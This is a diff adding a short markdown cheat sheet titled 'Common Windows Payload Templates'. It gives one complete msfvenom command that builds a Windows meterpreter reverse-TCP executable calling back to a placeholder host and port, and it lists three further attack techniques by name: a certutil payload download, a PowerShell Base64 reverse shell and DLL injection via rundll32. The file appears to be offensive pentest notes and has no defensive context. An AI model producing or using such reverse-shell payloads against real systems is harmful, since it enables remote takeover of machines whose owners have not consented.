@@ -1,0 +1,6 @@
+# Common Windows Payload Templates
+
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
+- Certutil Payload Download Trick
+- Powershell Base64 Reverse Shell
+- DLL Injection via rundll32
